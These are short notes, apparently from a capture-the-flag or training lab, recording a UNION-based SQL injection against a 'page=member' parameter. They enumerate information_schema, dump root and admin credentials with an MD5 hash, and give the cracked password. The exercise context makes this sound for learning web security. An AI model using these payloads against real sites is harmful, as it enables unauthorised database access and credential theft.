/index.php?page=member

1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
5 union all select table_name,column_name from information_schema.columns

table_schema: Member_Brute_Force
table_name: db_default
columns: id, username, password
5 union all select 1,concat(id,0x3a,username,0x3a,password) from Member_Brute_Force.db_default
=> 1:root:3bf1114a986ba87ed28fc1b5884fc2f8
=> 2:admin:3bf1114a986ba87ed28fc1b5884fc2f8
Sur internet on "dehash" ce mdp qui donne: shadow


table_schema: Member_Sql_Injection
table_name: users
columns: user_id, first_name, last_name, town, country, planet, Commentaire, countersign
